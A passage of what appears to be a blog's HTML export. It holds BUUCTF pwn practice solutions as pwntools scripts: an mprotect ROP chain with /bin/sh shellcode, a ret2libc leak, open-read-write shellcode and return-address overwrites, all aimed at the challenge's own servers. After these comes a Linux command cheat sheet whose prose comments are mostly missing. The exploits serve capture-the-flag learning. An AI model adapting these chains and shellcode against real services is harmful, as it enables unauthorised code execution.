class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29587</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.19\"</span>)</span><br><span class=\"line\">int = <span class=\"number\">0x080493e1</span></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x080bae06</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x080481c9</span></span><br><span class=\"line\">pop_ecx_ebx = <span class=\"number\">0x0806e851</span></span><br><span class=\"line\">mprotect = elf.sym[<span class=\"string\">\"mprotect\"</span>]</span><br><span class=\"line\">pop_edx_ecx_ebx = <span class=\"number\">0x0806e850</span></span><br><span class=\"line\">read = elf.sym[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">bss = elf.bss()</span><br><span class=\"line\">print(hex(bss))</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>)+p32(mprotect)+p32(pop_edx_ecx_ebx)+p32(<span class=\"number\">0x80ea000</span>)+p32(<span class=\"number\">0x2000</span>)+p32(<span class=\"number\">7</span>)</span><br><span class=\"line\">pld += p32(read)+p32(bss+<span class=\"number\">0x50</span>)+p32(<span class=\"number\">0</span>)+p32(bss+<span class=\"number\">0x50</span>)+p32(<span class=\"number\">0x50</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Your input :\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">s(<span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level1\"><a href=\"#jarvisoj-level1\" class=\"headerlink\" title=\"jarvisoj_level1\"></a>jarvisoj_level1</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27709</span>)</span><br><span class=\"line\">write_plt=elf.plt[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">write_got=elf.got[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">main_addr=elf.symbols[<span class=\"string\">'main'</span>]</span><br><span class=\"line\">pld1=<span class=\"string\">'A'</span>*<span class=\"number\">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class=\"number\">1</span>)+p32(write_got)+p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">sl(pld1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = uu32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">'write'</span>,write_addr)</span><br><span class=\"line\">libcbase=write_addr-libc.dump(<span class=\"string\">\"write\"</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">binsh=libcbase+libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libcbase)</span><br><span class=\"line\">pld=<span class=\"string\">'A'</span>*<span class=\"number\">140</span>+p32(system)+p32(<span class=\"number\">0</span>)+p32(binsh)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwnable-orw\"><a href=\"#pwnable-orw\" class=\"headerlink\" title=\"pwnable_orw\"></a>pwnable_orw</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26963)</span><br><span class=\"line\">shellcode&#x3D;asm(&#39;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#39;)</span><br><span class=\"line\">shellcode+&#x3D;asm(&#39;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#39;)</span><br><span class=\"line\">shellcode+&#x3D;asm(&#39;mov eax,0x4;mov ebx,0x1;int 0x80&#39;)</span><br><span class=\"line\">sl(shellcode)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"wustctf2020-getshell\"><a href=\"#wustctf2020-getshell\" class=\"headerlink\" title=\"wustctf2020_getshell\"></a>wustctf2020_getshell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29511)</span><br><span class=\"line\">pld &#x3D; b&#39;A&#39;*(0x18+0x4)+p32(0x0804851B)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"picoctf-2018-buffer-overflow-2\"><a href=\"#picoctf-2018-buffer-overflow-2\" class=\"headerlink\" title=\"picoctf_2018_buffer overflow 2\"></a>picoctf_2018_buffer overflow 2</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27988)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn3.24&quot;)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;pwn3.23&quot;,env &#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc-2.232.so&quot;&#125;)</span><br><span class=\"line\">pld &#x3D; b&#39;A&#39;*(0x6c+0x4)+p32(0x080485CB)+p32(0)+p32(0xDEADBEEF)+p32(0xDEADC0DE)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["BUU"]},{"title":"Linux","url":"https://pz1o.top/2021/01/23/linux/","content":"<p>linux</p>\n<h1 id=\"0x01-PWN\"><a href=\"#0x01-PWN\" class=\"headerlink\" title=\"0x01 PWN\"></a>0x01 PWN</h1><p>0pwn</p>\n<h2 id=\"1-vmtools\"><a href=\"#1-vmtools\" class=\"headerlink\" title=\"1.vmtools\"></a>1.vmtools</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar zxpf VMwareTools-x.x.x-yyyy.tar.gz</span><br><span class=\"line\">cd vmware-tools-distrib</span><br><span class=\"line\">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure>\n<p>YES</p>\n<p></p>\n<h2 id=\"2-git\"><a href=\"#2-git\" class=\"headerlink\" title=\"2.git\"></a>2.git</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-pip\"><a href=\"#3-pip\" class=\"headerlink\" title=\"3.pip\"></a>3.pip</h2><p>pip2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python-pip</span><br></pre></td></tr></table></figure>\n<p>pip3</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install python3-pip</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-vim\"><a href=\"#4-vim\" class=\"headerlink\" title=\"4.vim\"></a>4.vim</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get remove vim-common</span><br><span class=\"line\">sudo apt-get install vim</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-pwntools\"><a href=\"#5-pwntools\" class=\"headerlink\" title=\"5.pwntools\"></a>5.pwntools</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pwntools</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-libcSearcher\"><a href=\"#6-libcSearcher\" class=\"headerlink\" title=\"6.libcSearcher\"></a>6.libcSearcher</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class=\"line\">cd LibcSearcher</span><br><span class=\"line\">sudo python setup.py install</span><br><span class=\"line\">LibcSearcher.pyexpexp.py</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc</span><br><span class=\"line\">exp</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">elf&#x3D;ELF(&#39;libc.xx.xx&#39;)</span><br><span class=\"line\">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class=\"line\">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class=\"line\">sys_addr &#x3D; offset + libc.dump(&#39;system&#39;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"7-One-gadget\"><a href=\"#7-One-gadget\" class=\"headerlink\" title=\"7.One_gadget\"></a>7.One_gadget</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install ruby</span><br><span class=\"line\">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>\n<h2 id=\"8-pwndbg\"><a href=\"#8-pwndbg\" class=\"headerlink\" title=\"8.pwndbg\"></a>8.pwndbg</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class=\"line\">cd pwndbg</span><br><span class=\"line\">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>\n<h2 id=\"9-ssh\"><a href=\"#9-ssh\" class=\"headerlink\" title=\"9.ssh\"></a>9.ssh</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openssh-server</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">sudo service ssh start</span><br></pre></td></tr></table></figure>\n<p><strong>/etc/ssh/sshd_config</strong></p>\n<h2 id=\"10-conda\"><a href=\"#10-conda\" class=\"headerlink\" title=\"10.conda\"></a>10.conda</h2><p>conda</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh</span><br><span class=\"line\"></span><br><span class=\"line\">chmod 777 Miniconda3-latest-Linux-x86_64.sh</span><br><span class=\"line\">sh Miniconda3-latest-Linux-x86_64.sh</span><br><span class=\"line\"> </span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class=\"line\">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;</span><br><span class=\"line\">conda config --set show_channel_urls yes </span><br><span class=\"line\">conda config --get channels</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda config --remove-key channels</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda env list</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda create -n 3.6.7 python&#x3D;3.6.7</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda activate</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda deactivate</span><br><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">conda remove -n env_name --all</span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-\"><a href=\"#0x02-\" class=\"headerlink\" title=\"0x02 \"></a>0x02 </h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">top </span><br><span class=\"line\"></span><br><span class=\"line\">var&#x3D;value var</span><br><span class=\"line\">$var,$&#123;var&#125;  </span><br><span class=\"line\">&#96;cmd&#96; $(cmd) </span><br><span class=\"line\">&#39;$var&#39;        $var</span><br><span class=\"line\">&quot;$var&quot;\t\t\t\t1</span><br><span class=\"line\"></span><br><span class=\"line\">env  &#x2F;&#x2F;</span><br><span class=\"line\">LD_PRELOAD&#x3D;xx.so ldd a  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"netstat\"><a href=\"#netstat\" class=\"headerlink\" title=\"netstat\"></a>netstat</h2><p>netstatwin</p>\n<p>-a -n -b</p>\n<p><strong>linuxnetstat</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat</span><br><span class=\"line\">-a : socket</span><br><span class=\"line\">-t tcp</span><br><span class=\"line\">-u udp</span><br><span class=\"line\">-n </span><br><span class=\"line\">-l </span><br><span class=\"line\">-p PID</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">netstat -anp | grep   &#x2F;&#x2F;</span><br><span class=\"line\">netstat -aultp  &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/image-20200926113121287.png\" alt=\"image-20200926113121287\"></p>\n<h2 id=\"curl\"><a href=\"#curl\" class=\"headerlink\" title=\"curl\"></a>curl</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#</span><br><span class=\"line\">curl www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">curl -i www.baidu.com\t &#x2F;&#x2F;</span><br><span class=\"line\">curl -I www.baidu.com  &#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">curl -v www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">#get</span><br><span class=\"line\">curl http:&#x2F;&#x2F;httpbin.org&#x2F;get?id&#x3D;1</span><br><span class=\"line\">#post</span><br><span class=\"line\">curl -X POST --data &quot;name&#x3D;value&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class=\"line\">curl -X POST --data-urlencode &quot;date&#x3D;April 1&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class=\"line\"></span><br><span class=\"line\">#http</span><br><span class=\"line\">curl -X POST www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; action&#x3D;&quot;upload.cgi&quot;&gt;</span><br><span class=\"line\">&lt;input type&#x3D;file name&#x3D;upload&gt;</span><br><span class=\"line\">&lt;input type&#x3D;submit name&#x3D;press value&#x3D;&quot;OK&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">curl</span><br><span class=\"line\">curl --form upload&#x3D;xxx --form press&#x3D;xxx [URL]</span><br><span class=\"line\"></span><br><span class=\"line\">#Referer</span><br><span class=\"line\">curl --referer http:&#x2F;&#x2F;www.baidu.com http:&#x2F;&#x2F;www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#User agent</span><br><span class=\"line\">curl --user-agent &#39;[User Agent]&#39; [URL]</span><br><span class=\"line\"></span><br><span class=\"line\">#cookie</span><br><span class=\"line\">curl --cookir &quot;id&#x3D;xxx&quot; www.baidu.com</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">curl --header &quot;Content-Type:application&#x2F;json&quot; www.baidu.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"wget\"><a href=\"#wget\" class=\"headerlink\" title=\"wget\"></a>wget</h2><p>LinuxwgetLinux</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;wget</span><br><span class=\"line\">wget http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;wget -O</span><br><span class=\"line\">wget -O wordpress.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;wget limit -rate</span><br><span class=\"line\">wget --limit-rate&#x3D;300k http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">wget --user-agent&#x3D;Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit&#x2F;534.16 (KHTML, like Gecko) Chrome&#x2F;10.0.648.204 Safari&#x2F;534.16 http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;wget spider</span><br><span class=\"line\">wget --spider URL</span><br><span class=\"line\">200404</span><br></pre></td></tr></table></figure>\n<h2 id=\"tar\"><a href=\"#tar\" class=\"headerlink\" title=\"tar\"></a>tar</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xzvf  *.tar.gz</span><br><span class=\"line\">      tar [-cxtzjvfpPN]  ....</span><br><span class=\"line\">      </span><br><span class=\"line\">      -c (create )</span><br><span class=\"line\">      -x </span><br><span class=\"line\">      -t  tarfile </span><br><span class=\"line\">       c&#x2F;x&#x2F;t </span><br><span class=\"line\">      </span><br><span class=\"line\">      -z  gzip  gzip </span><br><span class=\"line\">      -j  bzip2  bzip2 </span><br><span class=\"line\">      -v </span><br><span class=\"line\">      -f  f </span><br></pre></td></tr></table></figure>\n<h2 id=\"nslookup\"><a href=\"#nslookup\" class=\"headerlink\" title=\"nslookup\"></a>nslookup</h2><p>nslookupDNS</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"find\"><a href=\"#find\" class=\"headerlink\" title=\"find\"></a>find</h2><p><a href=\"https://www.cnblogs.com/Ido-911/p/9638612.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/Ido-911/p/9638612.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">find test.c  //</span><br><span class=\"line\"><span class=\"comment\">#test</span></span><br><span class=\"line\">find / -name <span class=\"built_in\">test</span></span><br><span class=\"line\"><span class=\"comment\">#test</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> d -name <span class=\"built_in\">test</span></span><br><span class=\"line\"><span class=\"comment\">#flag</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name flag.txt</span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name flag.php</span><br><span class=\"line\"><span class=\"comment\">#txtphp</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name <span class=\"string\">\"*.txt\"</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -name <span class=\"string\">\"*.php\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#777</span></span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -perm 0777 -<span class=\"built_in\">print</span></span><br><span class=\"line\"><span class=\"comment\">#777()</span></span><br><span class=\"line\">find -<span class=\"built_in\">type</span> f ! -perm 777</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">find / -perm /u=r</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">find -perm /a=x</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br><span class=\"line\">find / -cmin -60</span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br><span class=\"line\">find / -mmin -60</span><br><span class=\"line\"><span class=\"comment\">#1</span></span><br><span class=\"line\">find / -amin -60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#50mb</span></span><br><span class=\"line\">find / -size 50M</span><br><span class=\"line\"><span class=\"comment\">#50mb-100mb</span></span><br><span class=\"line\">find / -size +50M -size -100M</span><br></pre></td></tr></table></figure>\n<h2 id=\"ps\"><a href=\"#ps\" class=\"headerlink\" title=\"ps\"></a>ps</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux | grep xx  &#x2F;&#x2F;</span><br><span class=\"line\">pstree  \t\t\t\t\t&#x2F;&#x2F;</span><br><span class=\"line\">pidof xx \t\t\t\t\t&#x2F;&#x2F;pid</span><br></pre></td></tr></table></figure>\n<h2 id=\"grep\"><a href=\"#grep\" class=\"headerlink\" title=\"grep\"></a>grep</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep [options]</span><br><span class=\"line\">  grep --help</span><br><span class=\"line\">  -c</span><br><span class=\"line\">  -i</span><br><span class=\"line\">  -h</span><br><span class=\"line\">  -l</span><br><span 